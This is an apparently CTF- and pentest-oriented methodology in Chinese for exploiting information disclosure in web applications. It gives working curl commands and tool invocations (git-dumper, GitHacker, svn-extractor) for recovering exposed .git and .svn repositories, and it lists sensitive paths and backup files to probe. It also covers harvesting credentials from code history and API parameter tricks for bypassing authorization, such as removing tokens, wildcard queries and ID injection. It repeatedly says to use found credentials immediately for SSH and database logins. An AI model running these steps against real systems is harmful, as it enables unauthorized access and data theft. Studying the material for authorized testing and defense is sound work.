# information-disclosure-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 信息泄露方法论

## ⛔ 深入参考（必读）

- .git 完整利用链（dump → 历史审计 → stash/分支 → 凭据提取）→ [references/source-recovery.md](references/source-recovery.md)
- .svn 利用（entries 文件 / wc.db SQLite 查询 / pristine 文件恢复）→ [references/source-recovery.md](references/source-recovery.md)
- .DS_Store 解析、Swagger 利用、凭据搜索 → [references/source-recovery.md](references/source-recovery.md)
- API 参数操控泄露（query=%通配符、info→list变换、pageSize放大、空数组绕过）→ [references/api-param-tricks.md](references/api-param-tricks.md)

## Phase 1: 源码和配置文件
直接请求常见敏感路径（逐一测试或批量扫描）：
```
/.git/HEAD          /.env              /config.py         /Dockerfile
/.svn/entries       /.svn/wc.db        /.DS_Store         /robots.txt
/WEB-INF/web.xml    /package.json      /app.py            /backup.sql
/.dockerenv         /composer.json     /Gemfile           /requirements.txt
```
1. 使用 `curl -s -o /dev/null -w '%{http_code}' http://TARGET/<path>` 批量检测状态码
2. 对 200 响应进一步检查内容是否为真实文件（排除自定义 404 页面）
3. `.git/HEAD` 返回 200 → git-dumper 整体 dump → git log 审计历史提交找密码/flag！
4. `.svn/entries` 或 `.svn/wc.db` 返回 200 → svn-extractor dump → 提取文件列表和内容
5. `.env` 返回 200 → 直接读取数据库连接串、API Key、SECRET_KEY 等敏感配置
→ 源码恢复详细步骤 → [references/source-recovery.md](references/source-recovery.md)

## Phase 2: 调试信息
1. 发送畸形请求触发 500 错误页面（缺少参数、类型不匹配、非法字符）
2. Flask `debug=True` 显示完整源码和交互式 debugger（可能直接 RCE）
3. Django DEBUG=True 显示 settings、URL 路由、SQL 查询
4. Stack Trace 中提取：文件绝对路径、框架版本、数据库类型、变量值
5. 检查响应 Header：`Server`、`X-Powered-By`、`X-Debug-Token`、`X-Request-Id`
6. 尝试访问 `/debug`、`/trace`、`/actuator`（Spring Boot）、`/elmah.axd`（.NET）

## Phase 3: API 文档泄露
1. 逐一请求文档端点：`/docs`、`/swagger`、`/swagger.json`、`/swagger-ui.html`
2. 补充路径：`/openapi.json`、`/redoc`、`/api-docs`、`/graphql`、`/graphiql`
3. 检查 `/v1/docs`、`/v2/docs` 等带版本前缀的路径
4. API 文档中提取：所有端点列表、参数类型和示例值、认证方式、数据模型定义
5. 重点关注管理接口（`/admin/*`）、用户管理（`/users`）、文件操作（`/upload`、`/download`）
6. GraphQL introspection 查询：`{__schema{types{name,fields{name}}}}`

## Phase 4: 备份和日志
1. 扫描备份文件：`/backup.zip`、`/backup.tar.gz`、`/app.py.bak`、`/web.config.old`
2. 文件名变体：`index.php.bak`、`index.php~`、`index.php.swp`、`.index.php.swp`
3. 日志文件：`/access.log`、`/error.log`、`/debug.log`、`/app.log`
4. 使用 `spray` 或 `ffuf` 配合备份字典扫描更多路径
5. 数据库备份：`/dump.sql`、`/db.sql`、`/database.sql`、`/backup.sql`
6. 版本控制残留：`/.hg/`（Mercurial）、`/.bzr/`（Bazaar）

## Phase 5: API 参数操控
1. 发现 API 接口后，对查询参数做四种操控：置空、`%` 通配符、null、删除参数
2. `pageSize=9999` 放大分页，获取更多数据
3. `info` → `list` 端点变换，寻找列表接口
4. 空数组 `[]` → 删除 Token，测试认证绕过
5. 添加 `verbose=true`、`debug=1` 参数，检查是否返回额外信息
→ 详细技巧和案例 → [references/api-param-tricks.md](references/api-param-tricks.md)

## Phase 6: 凭据搜索
1. 在已获取的源码/配置中搜索：`password`、`secret`、`api_key`、`token`、`mysql://`
2. 检查 `.env` 文件中的数据库连接串和第三方 API 密钥
3. 搜索 SSH 私钥：`/.ssh/id_rsa`、`/home/*/.ssh/id_rsa`
4. Base64 编码的凭据：解码所有 Base64 字符串检查内容
5. **找到凭据后立即使用**：登录 Web、SSH 连接、数据库直连
6. Git 历史中搜索已删除的密码：`git log -p -S 'password'`


---

## REF: api-param-tricks

# API 参数操控与信息泄露技巧

发现 API 接口后，通过参数操控可以泄露远超预期的数据。这些技巧的核心原理是：后端的查询逻辑和权限检查往往在参数"正常"时才生效，异常参数可能触发未预期的行为。

---

## 查询参数操控四式

遇到任何查询接口，依次尝试这四种操控：

```bash
# 假设正常请求
GET /api/demo/query=张三

# 1. 置空 — 可能返回默认/全部数据
GET /api/demo/query=

# 2. 通配符 — % 在 SQL LIKE 中匹配任意字符
GET /api/demo/query=%

# 3. null — 某些框架对 null 有特殊处理
GET /api/demo/query=null

# 4. 删除参数 — 后端可能跳过过滤直接返回全部
GET /api/demo/
```

为什么有效：开发者通常只测试"有值"的情况。空值可能导致 SQL 查询变成 `WHERE name LIKE '%%'`（匹配全部），null 可能跳过条件语句，删除参数可能使 WHERE 子句不生效。

---

## pageSize / limit 参数放大

分页接口默认返回 10-20 条数据，但后端可能没有上限限制：

```bash
# 正常分页
GET /api/users?page=1&pageSize=10     # 只返回 10 条

# 放大 pageSize
GET /api/users?page=1&pageSize=9999   # 可能返回所有用户
GET /api/users?page=1&limit=99999
GET /api/users?page=1&size=99999
GET /api/users?page=1&per_page=99999
GET /api/users?page=1&count=99999
```

配合查询置空一起用效果更好：
```bash
GET /api/users?query=%&pageSize=9999
# 通配符查询 + 无限分页 → 全量数据导出
```

---

## info → list 端点变换

个人信息接口（返回单条数据）改为列表接口（返回所有数据）：

```bash
# 原始：只返回自己的信息
GET /prod-api/system/info/small/userId

# 变换 1：末尾加 /list
GET /prod-api/system/info/small/userId/list
# → 可能 404，但继续尝试——

# 变换 2：删除个人标识，改用 list
GET /prod-api/system/info/list
# → 返回所有用户信息

# 变换 3：把 info 改为 list，末尾加 /
GET /api/user/ads/list/?a=123456
# 末尾斜杠在某些中间件（Nginx/Spring）中会触发不同路由

# 通用模式
/api/user/info    → /api/user/list
/api/order/detail → /api/order/list
/api/xxx/get      → /api/xxx/getAll 或 /api/xxx/findAll
```

---

## ID 参数位置变换

当接口用查询参数传递 ID 时，尝试把 ID 放到路径中（或反过来）：

```bash
# 正常查询参数写法
GET /api/v1/user/info?id=@saber

# 变换：ID 放到路径中
GET /api/v1/user/@saber

# 删除 ID → 可能返回所有用户
GET /api/user/        # 删除后 → 返回所有 userinfo
GET /api/123456/user  # ID 在前
GET /api/user/123456  # ID 在后
```

---

## 空数组响应 → 删除 Token

当查询接口返回空数组 `[]` 时，这说明查询逻辑生效了但被权限过滤了（只返回自己的——空的）。删除认证 Token 可能反而绕过用户过滤：

```bash
# 带 Token 请求
GET /api/users/search?q=test
Authorization: Bearer xxx
# → {"data": []}  空数组

# 删除 Token 请求
GET /api/users/search?q=test
# （无 Authorization 头）
# → {"data": [{"name":"张三","phone":"138..."}, ...]}  返回所有匹配
```

原理：开发者可能实现了 `WHERE user_id = current_user AND ...` 的过滤，但认证失败时没有返回 401，而是 current_user 变成了 null/空，导致 WHERE 条件变成 `WHERE null AND ...`，某些 ORM 会忽略 null 条件。

---

## 多个 JSON ID 批量注入

当请求体是 JSON 且包含单个 ID 时，尝试传入多个 ID 的 JSON 结构：

```bash
# 正常请求（单个 ID）
POST /api/user/info
{"uid": 100001}
# → 返回一条用户信息

# 批量注入（多个 JSON 对象）
POST /api/user/info
[{"uid": 100001}, {"uid": 100002}, {"uid": 100003}]
# → 可能返回三条用户信息

# 或者数组形式
POST /api/user/info
{"uid": [100001, 100002, 100003]}
```

---

## Authorization 字段探测

当请求包含 `Authorization` 头时，不要只测删除——修改值可能有不同效果：

```bash
# 置空 → 通常 401
Authorization: Bearer

# 设为简单值 → 可能绕过
Authorization: Bearer 1
Authorization: 1
Authorization: admin

# 设为通配符
Authorization: Bearer %
Authorization: Bearer *

# 如果这些返回了不同于 401 的响应（200/403/500），说明后端对这个值有处理逻辑，值得深入测试。
```

---

## 拼接 & 参数越权

当接口不接受直接修改 ID 时，尝试用 `&` 拼接额外的身份参数：

```bash
# 原始接口（只返回自己的信息，无法修改 Version 以外的参数）
GET /gateway/nuims/nuims?Action=GetUser&Version=2020-06-01

# 拼接 UserId 参数
GET /gateway/nuims/nuims?Action=GetUser&Version=2020-06-01&UserId=victim_id
# → 返回 victim 的信息

# 常见可拼接的参数名
&userId=xxx
&uid=xxx
&user_id=xxx
&account_id=xxx
&memberId=xxx
&owner=xxx
```

为什么有效：原始接口可能从 session 中取当前用户 ID，但如果请求中显式传了 UserId 参数，后端代码可能优先使用请求参数而非 session 值。

---

## 获取他人 ID 的途径

越权的前提是知道别人的 ID。以下功能点常常泄露用户 ID：

| 功能点 | 泄露方式 |
|--------|----------|
| 关注/粉丝列表 | 列表中的 user_id |
| 排行榜 | 排名数据中的 uid |
| 评论区 | 评论者 ID、回复者 ID |
| 投诉/反馈 | 提交者 ID |
| 社区/论坛 | 帖子作者 ID |
| 分享链接 | URL 中的 user 参数 |
| 二维码 | 扫码内容中的 ID |

找到 ID 后，立即在所有已知接口中替换测试。


---

## REF: source-recovery

# 源码恢复与信息泄露深度利用

## 目录

- [快速决策树](#快速决策树)
- [.git 源码泄露完整利用链](#git-源码泄露完整利用链)
- [.svn 源码泄露利用](#svn-源码泄露利用)
- [.DS_Store 解析](#ds_store-解析)
- [Swagger/OpenAPI 利用](#swaggeropenapi-利用)
- [备份和日志文件](#备份和日志文件)
- [源码中的硬编码凭据搜索](#源码中的硬编码凭据搜索)

---

## 快速决策树

发现版本控制泄露后的优先行动：

```
/.git/HEAD 返回 200?
  ├─ 是 → git-dumper 整体 dump → git log 审计历史 → 搜索凭据/flag
  └─ 403 → 尝试 /.git/config, /.git/logs/HEAD → 能访问则手动恢复

/.svn/entries 返回 200?（或 /.svn/wc.db）
  ├─ entries 有内容 → svn-extractor dump
  └─ wc.db 可下载 → sqlite3 查询文件列表 → 逐个下载

发现源码后 → 立即搜索凭据（密码、API key、数据库连接串）→ 利用凭据登录
```

---

## .git 源码泄露完整利用链

**核心价值**：`.git` 泄露不仅能恢复当前源码，还能恢复整个提交历史——开发者删除过的密码、测试账号、flag 都在历史提交里。

### Step 1: 确认泄露

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/.git/HEAD
# 200 → 泄露确认
# 403 → 目录被禁但文件可能可访问（见「部分封禁绕过」）
```

同时检查 `.git/config`，它经常暴露内部仓库地址：
```bash
curl -s http://target/.git/config
# [remote "origin"] url = https://git.company.com/internal/project.git
```

### Step 2: 整体 Dump

**git-dumper（快速恢复源码）：**
```bash
pip3 install git-dumper 2>/dev/null
git-dumper http://target/.git/ /tmp/git-dump/
cd /tmp/git-dump/
```

git-dumper 会自动遍历 refs、objects、packs，重建完整的 `.git` 目录。完成后 `/tmp/git-dump/` 就是一个合法的 git 仓库。

**GitHacker（推荐，恢复更完整——含 stash/所有分支/标签）：**
```bash
pip install GitHacker 2>/dev/null
githacker --brute --url http://target/.git/ --output-folder result
```

GitHacker 的 `--brute` 模式会暴力枚举分支和标签名，即使目标关闭了目录列表也能恢复。stash 里经常藏着开发者暂存的敏感修改。

**GitHack（备选）：**
```bash
python3 GitHack.py http://target/.git/
```

### Step 3: 审计提交历史（关键步骤）

dump 完成后，进入仓库目录，**先看历史再看代码**——开发者经常在早期提交里留下敏感信息，后来删除但历史里还在：

```bash
cd /tmp/git-dump/

# 查看所有提交历史（最重要）
git log --all --oneline

# 查看每次提交改了什么文件
git log --all --name-only --oneline

# 搜索提交消息中的关键词（"password", "secret", "flag", "remove", "delete"）
git log --all --oneline --grep="password"
git log --all --oneline --grep="flag"
git log --all --oneline --grep="secret"
git log --all --oneline --grep="remove"   # 开发者说"removed password"时，密码就在上一个提交

# 搜索所有提交内容中包含关键词的变更
git log --all -p -S "password"   # 哪个提交添加或删除了 "password" 字符串
git log --all -p -S "flag{"
git log --all -p -S "secret_key"
```

### Step 4: 检查特殊区域

```bash
# stash — 开发者临时保存的未提交改动，经常包含调试代码、硬编码密码
git stash list
git stash show -p stash@{0}

# 所有分支（包括远程分支引用）
git branch -a
# 切到其他分支查看
git checkout dev 2>/dev/null || git checkout develop 2>/dev/null

# 查看所有 tag
git tag -l
git show v1.0

# reflog — 即使提交被 reset/rebase 掉，reflog 里还有
git reflog
```

### Step 5: 从历史中提取敏感信息

```bash
# 对比当前和某个旧提交
git diff HEAD <old-commit-hash>

# 查看某个特定文件在某次提交时的内容
git show <commit-hash>:config.py
git show <commit-hash>:.env
git show <commit-hash>:settings.py

# 批量搜索所有历史中的敏感字符串
git grep -n "password" $(git rev-list --all)
git grep -n "flag{" $(git rev-list --all)
git grep -n "mysql://" $(git rev-list --all)
```

### 部分封禁绕过

有时管理员禁止了 `/.git/` 目录列表（返回 403），但具体文件仍可访问。这是因为 Web 服务器禁止了目录浏览但没有阻止文件请求：

```bash
# 目录返回 403
curl -s http://target/.git/       # → 403

# 但具体文件可以读
curl -s http://target/.git/HEAD   # → ref: refs/heads/main  ← 200!
curl -s http://target/.git/config
curl -s http://target/.git/logs/HEAD
```

如果具体文件可读，git-dumper 通常仍然能工作（它不依赖目录列表）。如果 git-dumper 也失败，手动恢复：

```bash
# 1. 获取 HEAD 引用
curl -s http://target/.git/HEAD
# → ref: refs/heads/main

# 2. 获取该引用的 commit hash
curl -s http://target/.git/refs/heads/main
# → a1b2c3d4e5f6...

# 3. 获取 logs/HEAD（包含所有历史 commit hash）
curl -s http://target/.git/logs/HEAD
# 每行格式: old_hash new_hash author timestamp message

# 4. 下载 object（hash 前2位是目录名，剩余是文件名）
# 比如 hash = a1b2c3d4e5...
curl -s http://target/.git/objects/a1/b2c3d4e5... -o obj.bin
# 用 python 解压: zlib.decompress(open('obj.bin','rb').read())
```

### .git 利用中常见的 CTF 模式

| 模式 | 说明 |
|------|------|
| flag 在旧提交里 | `git log -p` 发现某次提交删除了 flag |
| 密码在 .env 历史里 | 当前 .env 是空的，但 `git show HEAD~3:.env` 有密码 |
| stash 里有后门 | `git stash show -p` 看到调试密码 |
| config 暴露内部地址 | `.git/config` 的 remote URL 指向内网仓库 |
| 备份文件在 .bak 提交 | 某次提交添加了 `console.bak` 等文件 |

---

## .svn 源码泄露利用

SVN（Subversion）泄露的利用思路和 Git 类似，但目录结构不同。SVN 客户端会在工作目录下创建 `.svn/` 目录，包含所有文件的元数据和副本。

### Step 1: 确认泄露

```bash
# SVN 1.6 及更早版本
curl -s -o /dev/null -w "%{http_code}" http://target/.svn/entries
# 200 且内容非 HTML → SVN 泄露确认

# SVN 1.7+ 版本（entries 被 wc.db 替代）
curl -s -o /dev/null -w "%{http_code}" http://target/.svn/wc.db
# 200 → SVN 1.7+ 泄露确认
```

### Step 2: 使用工具 Dump

**svn-extractor（推荐）：**
```bash
pip3 install svn-extractor 2>/dev/null
svn-extractor --url http://target/.svn/ --match "\.php$|\.py$|\.js$|\.env|config|flag"
```

**dvcs-ripper（备选）：**
```bash
perl rip-svn.pl -v -u http://target/.svn/
```

### Step 3: 手动恢复（工具不可用时）

**SVN 1.6（entries 文件是纯文本）：**
```bash
# 下载 entries 文件
curl -s http://target/.svn/entries

# entries 文件格式（每 N 行描述一个文件）：
# 文件名
# 类型（file/dir）
# 版本号
# ...
# 从中提取出所有文件路径

# 文件内容在 text-base 目录下：
curl -s http://target/.svn/text-base/index.php.svn-base
curl -s http://target/.svn/text-base/config.php.svn-base
curl -s http://target/.svn/text-base/.env.svn-base
```

**SVN 1.7+（wc.db 是 SQLite 数据库）：**
```bash
# 下载 wc.db
curl -s http://target/.svn/wc.db -o /tmp/wc.db

# 查询文件列表
sqlite3 /tmp/wc.db "SELECT local_relpath, checksum FROM NODES WHERE kind='file';"

# 文件内容在 pristine 目录下，以 checksum 的 sha1 命名：
# checksum 格式: $sha1$abcdef1234567890...
# 文件路径: .svn/pristine/ab/abcdef1234567890....svn-base
curl -s http://target/.svn/pristine/ab/abcdef1234567890abcdef1234567890abcdef12.svn-base
```

### SVN 利用要点

- SVN 没有像 Git 那样丰富的本地历史浏览能力，但 `entries` 和 `wc.db` 会暴露**所有被版本控制的文件路径**，包括你通过目录扫描找不到的隐藏文件
- `wc.db` 的 `NODES` 表里 `changed_revision` 字段可以看到每个文件的最后修改版本号
- 有些 SVN 部署会暴露 `/.svn/prop-base/` 下的属性文件，可能包含额外元数据

---

## .DS_Store 解析

macOS 生成的 `.DS_Store` 文件包含目录中的文件名列表——相当于免费的目录扫描结果：

```bash
# 简单 strings 提取（通常够用）
curl -s http://target/.DS_Store | strings | sort -u

# Python 库精确解析
pip3 install ds-store 2>/dev/null
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/DS_Store') as ds:
    for entry in ds:
        print(entry.filename)
"
```

发现的文件名可能包括：`flag.txt`、`admin/`、`backup.sql`、`.env` 等目录扫描字典里没有的路径。

---

## Swagger/OpenAPI 利用

发现 API 文档后重点关注：
- **隐藏端点**：文档中有但页面没展示的 API（如 `/api/admin/flag`）
- **参数定义**：知道确切参数名和类型，可精准构造请求
- **认证方式**：Bearer token/API key/Basic auth

### API 文档泄露路径
```
/docs (FastAPI)
/swagger (Swagger UI)
/swagger.json
/openapi.json
/redoc
/api-docs
/graphql (GraphQL Playground)
```

---

## 备份和日志文件

```
/backup.zip       /backup.tar.gz     /www.zip         /www.tar.gz
/app.py.bak       /config.py.bak     /index.php.bak   /web.config.bak
/.env.bak         /.env.old          /.env.example
/access.log       /error.log         /debug.log
```

---

## 源码中的硬编码凭据搜索

发现源码后（无论来自 .git dump、备份文件、还是 .svn 恢复），立即搜索：

- **密码**: `password`, `passwd`, `pwd`, `secret`, `credential`
- **API 密钥**: `api_key`, `apikey`, `token`, `auth`, `bearer`
- **数据库连接**: `mysql://`, `postgres://`, `sqlite`, `mongodb://`, `redis://`
- **SSH/远程**: SSH 用户名和密码、私钥路径
- **Base64 编码**: 解码可疑的 Base64 字符串
- **flag 格式**: `flag{`, `flag-{`, `ctf{`, `key{`

```bash
# 在 dump 出的源码目录中批量搜索
cd /tmp/git-dump/  # 或 svn-dump 目录
grep -rn "password\|passwd\|secret\|api_key\|flag{" . --include="*.py" --include="*.php" --include="*.js" --include="*.env" --include="*.yml" --include="*.conf"
```

**找到凭据后立即使用**：登录 Web、SSH（注意 Docker 映射高端口）、数据库连接。不要继续搜索——先用已有凭据扩大访问权限。
